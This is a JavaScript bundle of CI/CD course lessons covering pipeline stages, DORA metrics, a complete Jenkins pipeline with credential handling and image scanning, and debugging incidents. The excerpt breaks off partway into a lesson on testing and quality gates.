(function(m,c){var L=window.ACADEMY.lessons;for(var id in c){Object.assign(L[id],c[id]);}(window.ACADEMY_LOADED=window.ACADEMY_LOADED||{})[m]=1;})("cicd",{"cicd/pipeline-fundamentals":{"html":"\u003cp>A team merges code on Friday, and an engineer spends the evening building, copying files to servers and hoping. The next release is delayed because nobody remembers the steps. A pipeline replaces that evening with an automated, repeatable path from a code change to a running service, and it does it the same way every time.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The difference between CI, continuous delivery and continuous deployment\u003c/li>\n\u003cli>The stages of a typical pipeline\u003c/li>\n\u003cli>Principles of fast, reliable pipelines\u003c/li>\n\u003cli>How to measure whether delivery is healthy\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"three-terms-often-confused\">Three terms, often confused\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Term\u003c/th>\n\u003cth>Meaning\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>\u003cstrong>Continuous integration (CI)\u003c/strong>\u003c/td>\n\u003ctd>Every change is built and tested automatically, and merged into the shared mainline often\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003cstrong>Continuous delivery\u003c/strong>\u003c/td>\n\u003ctd>Every passing change is ready to release, and a human decides when\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003cstrong>Continuous deployment\u003c/strong>\u003c/td>\n\u003ctd>Every passing change is released to production automatically\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Most teams practise CI everywhere, continuous delivery as a baseline, and continuous deployment where their tests and monitoring are strong enough to trust it.\u003c/p>\n\u003ch2 id=\"stages-of-a-pipeline\">Stages of a pipeline\u003c/h2>\n\u003col>\n\u003cli>\u003cstrong>Checkout\u003c/strong> the source at the exact revision.\u003c/li>\n\u003cli>\u003cstrong>Build\u003c/strong> the artifact once, for example a container image.\u003c/li>\n\u003cli>\u003cstrong>Test\u003c/strong>: fast unit tests first, then integration tests.\u003c/li>\n\u003cli>\u003cstrong>Analyze\u003c/strong>: linting, dependency checks, secret scanning, image scanning.\u003c/li>\n\u003cli>\u003cstrong>Publish\u003c/strong> the artifact to a registry with an immutable version tag.\u003c/li>\n\u003cli>\u003cstrong>Deploy\u003c/strong> to a test environment, run smoke tests.\u003c/li>\n\u003cli>\u003cstrong>Promote\u003c/strong> the \u003cem>same artifact\u003c/em> to production, then verify it.\u003c/li>\n\u003c/ol>\n\u003cp>Two rules deserve emphasis:\u003c/p>\n\u003cul>\n\u003cli>\u003cstrong>Build once, deploy many.\u003c/strong> The image tested in staging must be the image that reaches production. Rebuilding for each environment means you tested something different from what you shipped.\u003c/li>\n\u003cli>\u003cstrong>Order checks by speed.\u003c/strong> Put the quick, cheap feedback first (lint, unit tests) so a typo fails in seconds, not after a 20-minute build.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"principles\">Principles\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Principle\u003c/th>\n\u003cth>Why\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Fast feedback\u003c/td>\n\u003ctd>Developers wait for pipelines. Aim for the main checks in under ten minutes\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Deterministic\u003c/td>\n\u003ctd>The same input gives the same result. Pin tool and dependency versions\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Fail loudly\u003c/td>\n\u003ctd>A red build must block the merge or deploy. Never leave a &quot;known flaky&quot; step ignored\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Secrets are managed\u003c/td>\n\u003ctd>Credentials come from a secret store at run time, never from files in the source\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Pipeline as code\u003c/td>\n\u003ctd>The definition lives next to the application, reviewed like any change\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Least privilege\u003c/td>\n\u003ctd>Build jobs can push images but should not be able to modify production directly\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003ch2 id=\"measuring-delivery-health\">Measuring delivery health\u003c/h2>\n\u003cp>The four widely used delivery metrics (from DORA research) give you a shared language:\u003c/p>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Metric\u003c/th>\n\u003cth>Question it answers\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Deployment frequency\u003c/td>\n\u003ctd>How often do we release?\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Lead time for changes\u003c/td>\n\u003ctd>How long from commit to production?\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Change failure rate\u003c/td>\n\u003ctd>What share of releases cause a problem?\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Time to restore service\u003c/td>\n\u003ctd>How fast do we recover when one does?\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Frequent small releases generally improve \u003cstrong>all four\u003c/strong>, because small changes are easier to review, test and roll back.\u003c/p>\n\u003ch2 id=\"incident-tests-pass-production-breaks\">Incident: tests pass, production breaks\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>The pipeline is green for version 2.4.0, but production returns errors immediately after the release. Staging was fine yesterday.\u003c/p>\n\u003c/aside>\n\u003cp>Compare what each environment actually runs:\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl get deploy shop-api -n shop-staging -o jsonpath='{.spec.template.spec.containers[0].image}'\nkubectl get deploy shop-api -n shop-prod -o jsonpath='{.spec.template.spec.containers[0].image}'\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get deploy shop-api -n shop-staging -o jsonpath=\u003cspan class=\"hljs-string\">&#x27;{.spec.template.spec.containers[0].image}&#x27;\u003c/span>\u003c/span>\u003cspan class=\"ln out\">registry.example.com/shop-api:2.4.0-rc1\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get deploy shop-api -n shop-prod -o jsonpath=\u003cspan class=\"hljs-string\">&#x27;{.spec.template.spec.containers[0].image}&#x27;\u003c/span>\u003c/span>\u003cspan class=\"ln out\">registry.example.com/shop-api:2.4.0\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Staging ran a build from a release candidate, while production got a \u003cstrong>separate rebuild\u003c/strong> that picked up a newer dependency version. The artifact that was tested is not the artifact that shipped. Fix the pipeline so one build produces one image tagged with a unique revision, and every environment deploys that exact tag (or digest). Pin dependency versions with a lock file so rebuilds are reproducible. Roll production back to the last good tag while you do it.\u003c/p>\n\u003ch2 id=\"predict-the-pipeline\">Predict the pipeline\u003c/h2>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> A pipeline has stages build, test and deploy. The test stage fails. What should happen to deploy?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> It does not run, and the pipeline reports failure.\u003c/p>\u003cp>Stages run in order and stop on failure. A broken change should never reach deployment.\u003c/p>\u003c/div>\u003c/div>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Two developers merge within seconds and both pipelines deploy to production. What risk appears?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> The older build can finish last and overwrite the newer one.\u003c/p>\u003cp>Use a concurrency group or a queue so only one deploy runs at a time, and deploy a specific version.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Rebuilding the artifact per environment\u003c/li>\n\u003cli>Treating a flaky test as noise instead of fixing or removing it\u003c/li>\n\u003cli>Giving the pipeline broad production credentials\u003c/li>\n\u003cli>Skipping post-deploy verification\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"three-terms-often-confused","text":"Three terms, often confused"},{"id":"stages-of-a-pipeline","text":"Stages of a pipeline"},{"id":"principles","text":"Principles"},{"id":"measuring-delivery-health","text":"Measuring delivery health"},{"id":"incident-tests-pass-production-breaks","text":"Incident: tests pass, production breaks"},{"id":"predict-the-pipeline","text":"Predict the pipeline"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Martin Fowler: Continuous Integration","u":"https://martinfowler.com/articles/continuousIntegration.html"},{"t":"Continuous Delivery (Jez Humble and Dave Farley)","u":"https://continuousdelivery.com/"},{"t":"DORA research and metrics","u":"https://dora.dev/"}],"text":"A team merges code on Friday, and an engineer spends the evening building, copying files to servers and hoping. The next release is delayed because nobody remembers the steps. A pipeline replaces that evening with an automated, repeatable path from a code change to a running service, and it does it the same way every time. What you will learn The difference between CI, continuous delivery and continuous deployment The stages of a typical pipeline Principles of fast, reliable pipelines How to measure whether delivery is healthy Three terms, often confused Term Meaning Continuous integration (CI) Every change is built and tested automatically, and merged into the shared mainline often Continuous delivery Every passing change is ready to release, and a human decides when Continuous deployment Every passing change is released to production automatically Most teams practise CI everywhere, continuous delivery as a baseline, and continuous deployment where their tests and monitoring are strong enough to trust it. Stages of a pipeline Checkout the source at the exact revision. Build the artifact once, for example a container image. Test : fast unit tests first, then integration tests. Analyze : linting, dependency checks, secret scanning, image scanning. Publish the artifact to a registry with an immutable version tag. Deploy to a test environment, run smoke tests. Promote the same artifact to production, then verify it. Two rules deserve emphasis: Build once, deploy many. The image tested in staging must be the image that reaches production. Rebuilding for each environment means you tested something different from what you shipped. Order checks by speed. Put the quick, cheap feedback first (lint, unit tests) so a typo fails in seconds, not after a 20-minute build. Principles Principle Why Fast feedback Developers wait for pipelines. Aim for the main checks in under ten minutes Deterministic The same input gives the same result. Pin tool and dependency versions Fail loudly A red build must block the merge or deploy. Never leave a \"known flaky\" step ignored Secrets are managed Credentials come from a secret store at run time, never from files in the source Pipeline as code The definition lives next to the application, reviewed like any change Least privilege Build jobs can push images but should not be able to modify production directly Measuring delivery health The four widely used delivery metrics (from DORA research) give you a shared language: Metric Question it answers Deployment frequency How often do we release? Lead time for changes How long from commit to production? Change failure rate What share of releases cause a problem? Time to restore service How fast do we recover when one does? Frequent small releases generally improve all four , because small changes are easier to review, test and roll back. Incident: tests pass, production breaks Incident The pipeline is green for version 2.4.0, but production returns errors immediately after the release. Staging was fine yesterday. Compare what each environment actually runs: $ kubectl get deploy shop-api -n shop-staging -o jsonpath= &#x27;{.spec.template.spec.containers[0].image}&#x27; registry.example.com/shop-api:2.4.0-rc1 $ kubectl get deploy shop-api -n shop-prod -o jsonpath= &#x27;{.spec.template.spec.containers[0].image}&#x27; registry.example.com/shop-api:2.4.0 Staging ran a build from a release candidate, while production got a separate rebuild that picked up a newer dependency version. The artifact that was tested is not the artifact that shipped. Fix the pipeline so one build produces one image tagged with a unique revision, and every environment deploys that exact tag (or digest). Pin dependency versions with a lock file so rebuilds are reproducible. Roll production back to the last good tag while you do it. Predict the pipeline Predict first. A pipeline has stages build, test and deploy. The test stage fails. What should happen to deploy? Your guess Answer: It does not"},"cicd/building-a-pipeline":{"html":"\u003cp>Theory becomes useful when you can write the pipeline. This lesson builds a complete declarative Jenkins pipeline for a containerized service. The ideas carry over directly to other CI systems: stages, steps, environment, credentials, conditions and post-actions exist everywhere under different names.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The structure of a declarative pipeline\u003c/li>\n\u003cli>Credentials, parameters and conditions\u003c/li>\n\u003cli>Parallel stages and post actions\u003c/li>\n\u003cli>How to debug a failing build\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-complete-pipeline\">A complete pipeline\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"groovy\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"pipeline {\n  agent { label 'docker' }\n\n  options {\n    timeout(time: 30, unit: 'MINUTES')\n    disableConcurrentBuilds()\n    buildDiscarder(logRotator(numToKeepStr: '30'))\n  }\n\n  environment {\n    REGISTRY = 'registry.example.com'\n    IMAGE    = &quot;${REGISTRY}/shop-api&quot;\n    TAG      = &quot;build-${env.BUILD_NUMBER}&quot;\n  }\n\n  stages {\n    stage('Checkout') {\n      steps {\n        checkout scm\n      }\n    }\n\n    stage('Test') {\n      parallel {\n        stage('Unit tests') {\n          steps { sh 'make test' }\n        }\n        stage('Lint') {\n          steps { sh 'make lint' }\n        }\n      }\n    }\n\n    stage('Build image') {\n      steps {\n        sh 'docker build -t &quot;$IMAGE:$TAG&quot; .'\n      }\n    }\n\n    stage('Scan image') {\n      steps {\n        sh 'trivy image --severity HIGH,CRITICAL --exit-code 1 &quot;$IMAGE:$TAG&quot;'\n      }\n    }\n\n    stage('Push') {\n      when { branch 'main' }\n      steps {\n        withCredentials([usernamePassword(credentialsId: 'registry-creds',\n                                          usernameVariable: 'REG_USER',\n                                          passwordVariable: 'REG_PASS')]) {\n          sh 'echo &quot;$REG_PASS&quot; | docker login &quot;$REGISTRY&quot; -u &quot;$REG_USER&quot; --password-stdin'\n          sh 'docker push &quot;$IMAGE:$TAG&quot;'\n        }\n      }\n    }\n\n    stage('Deploy to staging') {\n      when { branch 'main' }\n      steps {\n        sh 'kubectl --context staging set image deployment/shop-api api=&quot;$IMAGE:$TAG&quot; -n shop'\n        sh 'kubectl --context staging rollout status deployment/shop-api -n shop --timeout=180s'\n      }\n    }\n  }\n\n  post {\n    failure {\n      echo &quot;Build ${env.BUILD_NUMBER} failed&quot;\n    }\n    always {\n      sh 'docker logout &quot;$REGISTRY&quot; || true'\n    }\n  }\n}\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">pipeline {\n  agent { label \u003cspan class=\"hljs-string\">&#x27;docker&#x27;\u003c/span> }\n\n  options {\n    timeout(\u003cspan class=\"hljs-attr\">time:\u003c/span> \u003cspan class=\"hljs-number\">30\u003c/span>, \u003cspan class=\"hljs-attr\">unit:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;MINUTES&#x27;\u003c/span>)\n    disableConcurrentBuilds()\n    buildDiscarder(logRotator(\u003cspan class=\"hljs-attr\">numToKeepStr:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;30&#x27;\u003c/span>))\n  }\n\n  environment {\n    REGISTRY = \u003cspan class=\"hljs-string\">&#x27;registry.example.com&#x27;\u003c/span>\n    IMAGE    = \u003cspan class=\"hljs-string\">&quot;${REGISTRY}/shop-api&quot;\u003c/span>\n    TAG      = \u003cspan class=\"hljs-string\">&quot;build-${env.BUILD_NUMBER}&quot;\u003c/span>\n  }\n\n  stages {\n    stage(\u003cspan class=\"hljs-string\">&#x27;Checkout&#x27;\u003c/span>) {\n      steps {\n        checkout scm\n      }\n    }\n\n    stage(\u003cspan class=\"hljs-string\">&#x27;Test&#x27;\u003c/span>) {\n      parallel {\n        stage(\u003cspan class=\"hljs-string\">&#x27;Unit tests&#x27;\u003c/span>) {\n          steps { sh \u003cspan class=\"hljs-string\">&#x27;make test&#x27;\u003c/span> }\n        }\n        stage(\u003cspan class=\"hljs-string\">&#x27;Lint&#x27;\u003c/span>) {\n          steps { sh \u003cspan class=\"hljs-string\">&#x27;make lint&#x27;\u003c/span> }\n        }\n      }\n    }\n\n    stage(\u003cspan class=\"hljs-string\">&#x27;Build image&#x27;\u003c/span>) {\n      steps {\n        sh \u003cspan class=\"hljs-string\">&#x27;docker build -t &quot;$IMAGE:$TAG&quot; .&#x27;\u003c/span>\n      }\n    }\n\n    stage(\u003cspan class=\"hljs-string\">&#x27;Scan image&#x27;\u003c/span>) {\n      steps {\n        sh \u003cspan class=\"hljs-string\">&#x27;trivy image --severity HIGH,CRITICAL --exit-code 1 &quot;$IMAGE:$TAG&quot;&#x27;\u003c/span>\n      }\n    }\n\n    stage(\u003cspan class=\"hljs-string\">&#x27;Push&#x27;\u003c/span>) {\n      when { branch \u003cspan class=\"hljs-string\">&#x27;main&#x27;\u003c/span> }\n      steps {\n        withCredentials([usernamePassword(\u003cspan class=\"hljs-attr\">credentialsId:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;registry-creds&#x27;\u003c/span>,\n                                          \u003cspan class=\"hljs-symbol\">usernameVariable:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;REG_USER&#x27;\u003c/span>,\n                                          \u003cspan class=\"hljs-symbol\">passwordVariable:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;REG_PASS&#x27;\u003c/span>)]) {\n          sh \u003cspan class=\"hljs-string\">&#x27;echo &quot;$REG_PASS&quot; | docker login &quot;$REGISTRY&quot; -u &quot;$REG_USER&quot; --password-stdin&#x27;\u003c/span>\n          sh \u003cspan class=\"hljs-string\">&#x27;docker push &quot;$IMAGE:$TAG&quot;&#x27;\u003c/span>\n        }\n      }\n    }\n\n    stage(\u003cspan class=\"hljs-string\">&#x27;Deploy to staging&#x27;\u003c/span>) {\n      when { branch \u003cspan class=\"hljs-string\">&#x27;main&#x27;\u003c/span> }\n      steps {\n        sh \u003cspan class=\"hljs-string\">&#x27;kubectl --context staging set image deployment/shop-api api=&quot;$IMAGE:$TAG&quot; -n shop&#x27;\u003c/span>\n        sh \u003cspan class=\"hljs-string\">&#x27;kubectl --context staging rollout status deployment/shop-api -n shop --timeout=180s&#x27;\u003c/span>\n      }\n    }\n  }\n\n  post {\n    failure {\n      echo \u003cspan class=\"hljs-string\">&quot;Build ${env.BUILD_NUMBER} failed&quot;\u003c/span>\n    }\n    always {\n      sh \u003cspan class=\"hljs-string\">&#x27;docker logout &quot;$REGISTRY&quot; || true&#x27;\u003c/span>\n    }\n  }\n}\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"reading-it\">Reading it\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Part\u003c/th>\n\u003cth>What it does\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>\u003ccode>agent\u003c/code>\u003c/td>\n\u003ctd>Which worker runs the job\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>options\u003c/code>\u003c/td>\n\u003ctd>Timeout, one build at a time, log retention\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>environment\u003c/code>\u003c/td>\n\u003ctd>Variables for all stages. The image tag is unique per build, so every image is traceable to one run\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>stages\u003c/code> and \u003ccode>steps\u003c/code>\u003c/td>\n\u003ctd>The ordered work. \u003ccode>parallel\u003c/code> runs independent stages at the same time\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>when\u003c/code>\u003c/td>\n\u003ctd>Condition. Push and deploy happen only on the main branch\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>withCredentials\u003c/code>\u003c/td>\n\u003ctd>Injects secrets for the block only and masks them in logs\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>\u003ccode>post\u003c/code>\u003c/td>\n\u003ctd>Runs after the stages: \u003ccode>always\u003c/code>, \u003ccode>failure\u003c/code>, \u003ccode>success\u003c/code>\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Notice the single quotes around shell commands that use \u003ccode>$IMAGE\u003c/code>. With single quotes, the \u003cem>shell\u003c/em> expands the variable, so Jenkins never interpolates a secret into the command string. With double quotes, Groovy interpolates first and credentials can leak into the build log or process list.\u003c/p>\n\u003caside class=\"callout callout-warning\">\u003cdiv class=\"callout-title\">Warning\u003c/div>\u003cp>Do not put credentials in the pipeline file, in environment variables defined in the file, or in the image. Store them in the CI system&#39;s credential store and reference them by ID. Give the registry credential push rights only to the repository it needs.\u003c/p>\n\u003c/aside>\n\u003ch2 id=\"habits-that-keep-pipelines-healthy\">Habits that keep pipelines healthy\u003c/h2>\n\u003cul>\n\u003cli>Keep the pipeline file small by moving logic into scripts (\u003ccode>make test\u003c/code>, \u003ccode>./ci/deploy.sh\u003c/code>) that developers can run locally the same way.\u003c/li>\n\u003cli>Fail fast with \u003ccode>set -euo pipefail\u003c/code> in scripts, as in the scripting module.\u003c/li>\n\u003cli>Cache dependencies carefully and key the cache on the lock file.\u003c/li>\n\u003cli>Archive test reports and keep logs, so failures can be diagnosed afterward.\u003c/li>\n\u003cli>Verify after deploy. \u003ccode>rollout status\u003c/code> makes the pipeline fail if the new version never becomes ready.\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"incident-the-build-passes-locally-but-fails-in-ci\">Incident: the build passes locally but fails in CI\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>\u003ccode>make test\u003c/code> passes on your laptop. In the pipeline the Test stage fails with \u003ccode>ModuleNotFoundError: No module named &#39;psycopg2&#39;\u003c/code>.\u003c/p>\n\u003c/aside>\n\u003cp>The console log shows the exact command and the environment it ran in:\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">[Pipeline] sh\u003c/span>\u003cspan class=\"ln out\">+ make test\u003c/span>\u003cspan class=\"ln out\">python -m pytest\u003c/span>\u003cspan class=\"ln out\">ModuleNotFoundError: No module named 'psycopg2'\u003c/span>\u003cspan class=\"ln out\">make: *** [test] Error 1\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Your laptop has the package installed globally from months ago; the clean CI worker does not. The pipeline had no step that installs the declared dependencies, so it relied on an accident. The cure is to make the build self-contained: install from the lock file in an isolated environment, and ideally run tests inside the same container image you build.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python -m venv .venv\n. .venv/bin/activate\npip install --require-hashes -r requirements.lock\npython -m pytest\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">python -m venv .venv\n. .venv/bin/activate\npip install --require-hashes -r requirements.lock\npython -m pytest\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A good rule: if a step only works on one machine, the pipeline has found an undeclared dependency. That is a feature of CI, not an annoyance.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Using double-quoted shell strings with secrets\u003c/li>\n\u003cli>No timeout, so a hung step blocks the agent forever\u003c/li>\n\u003cli>Deploying from any branch instead of only the main branch\u003c/li>\n\u003cli>Tests that depend on tools installed manually on the worker\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"a-complete-pipeline","text":"A complete pipeline"},{"id":"reading-it","text":"Reading it"},{"id":"habits-that-keep-pipelines-healthy","text":"Habits that keep pipelines healthy"},{"id":"incident-the-build-passes-locally-but-fails-in-ci","text":"Incident: the build passes locally but fails in CI"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Jenkins: Pipeline syntax","u":"https://www.jenkins.io/doc/book/pipeline/syntax/"},{"t":"Jenkins documentation","u":"https://www.jenkins.io/doc/"},{"t":"Jenkins: using credentials","u":"https://www.jenkins.io/doc/book/using/using-credentials/"}],"text":"Theory becomes useful when you can write the pipeline. This lesson builds a complete declarative Jenkins pipeline for a containerized service. The ideas carry over directly to other CI systems: stages, steps, environment, credentials, conditions and post-actions exist everywhere under different names. What you will learn The structure of a declarative pipeline Credentials, parameters and conditions Parallel stages and post actions How to debug a failing build A complete pipeline pipeline { agent { label &#x27;docker&#x27; } options { timeout( time: 30 , unit: &#x27;MINUTES&#x27; ) disableConcurrentBuilds() buildDiscarder(logRotator( numToKeepStr: &#x27;30&#x27; )) } environment { REGISTRY = &#x27;registry.example.com&#x27; IMAGE = \"${REGISTRY}/shop-api\" TAG = \"build-${env.BUILD_NUMBER}\" } stages { stage( &#x27;Checkout&#x27; ) { steps { checkout scm } } stage( &#x27;Test&#x27; ) { parallel { stage( &#x27;Unit tests&#x27; ) { steps { sh &#x27;make test&#x27; } } stage( &#x27;Lint&#x27; ) { steps { sh &#x27;make lint&#x27; } } } } stage( &#x27;Build image&#x27; ) { steps { sh &#x27;docker build -t \"$IMAGE:$TAG\" .&#x27; } } stage( &#x27;Scan image&#x27; ) { steps { sh &#x27;trivy image --severity HIGH,CRITICAL --exit-code 1 \"$IMAGE:$TAG\"&#x27; } } stage( &#x27;Push&#x27; ) { when { branch &#x27;main&#x27; } steps { withCredentials([usernamePassword( credentialsId: &#x27;registry-creds&#x27; , usernameVariable: &#x27;REG_USER&#x27; , passwordVariable: &#x27;REG_PASS&#x27; )]) { sh &#x27;echo \"$REG_PASS\" | docker login \"$REGISTRY\" -u \"$REG_USER\" --password-stdin&#x27; sh &#x27;docker push \"$IMAGE:$TAG\"&#x27; } } } stage( &#x27;Deploy to staging&#x27; ) { when { branch &#x27;main&#x27; } steps { sh &#x27;kubectl --context staging set image deployment/shop-api api=\"$IMAGE:$TAG\" -n shop&#x27; sh &#x27;kubectl --context staging rollout status deployment/shop-api -n shop --timeout=180s&#x27; } } } post { failure { echo \"Build ${env.BUILD_NUMBER} failed\" } always { sh &#x27;docker logout \"$REGISTRY\" || true&#x27; } } } Reading it Part What it does agent Which worker runs the job options Timeout, one build at a time, log retention environment Variables for all stages. The image tag is unique per build, so every image is traceable to one run stages and steps The ordered work. parallel runs independent stages at the same time when Condition. Push and deploy happen only on the main branch withCredentials Injects secrets for the block only and masks them in logs post Runs after the stages: always , failure , success Notice the single quotes around shell commands that use $IMAGE . With single quotes, the shell expands the variable, so Jenkins never interpolates a secret into the command string. With double quotes, Groovy interpolates first and credentials can leak into the build log or process list. Warning Do not put credentials in the pipeline file, in environment variables defined in the file, or in the image. Store them in the CI system&#39;s credential store and reference them by ID. Give the registry credential push rights only to the repository it needs. Habits that keep pipelines healthy Keep the pipeline file small by moving logic into scripts ( make test , ./ci/deploy.sh ) that developers can run locally the same way. Fail fast with set -euo pipefail in scripts, as in the scripting module. Cache dependencies carefully and key the cache on the lock file. Archive test reports and keep logs, so failures can be diagnosed afterward. Verify after deploy. rollout status makes the pipeline fail if the new version never becomes ready. Incident: the build passes locally but fails in CI Incident make test passes on your laptop. In the pipeline the Test stage fails with ModuleNotFoundError: No module named &#39;psycopg2&#39; . The console log shows the exact command and the environment it ran in: [Pipeline] sh + make test python -m pytest ModuleNotFoundError: No module named 'psycopg2' make: *** [test] Error 1 Your laptop has the package install"},"cicd/testing-and-quality-gates":{"html":"\u003cp>A pipeline that builds but does not test only delivers bugs faster. A pipeline with slow, flaky tests teaches people to ignore red builds. Good test strategy gives fast feedback first and expensive confidence later, and treats failures as information you can trust.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>The test pyramid and what belongs at each level\u003c/li>\n\u003cli>Ordering pipeline stages for fast feedback\u003c/li>\n\u003cli>Quality gates: linting, coverage thresholds and static analysis\u003c/li>\n\u003cli>Dealing with flaky tests and slow suites\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-test-pyramid\">The test pyramid\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Level\u003c/th>\n\u003cth>What it checks\u003c/th>\n\u003cth>Speed\u003c/th>\n\u003cth>How many\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Unit\u003c/td>\n\u003ctd>One function or class, no network or disk\u003c/td>\n\u003ctd>Milliseconds\u003c/td>\n\u003ctd>Thousands\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Integration\u003c/td>\n\u003ctd>A component with a real database, queue or API\u003c/td>\n\u003ctd>Seconds\u003c/td>\n\u003ctd>Hundreds\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>End to end\u003c/td>\n\u003ctd>The deployed system through its public interface\u003c/td>\n\u003ctd>Minutes\u003c/td>\n\u003ctd>A few 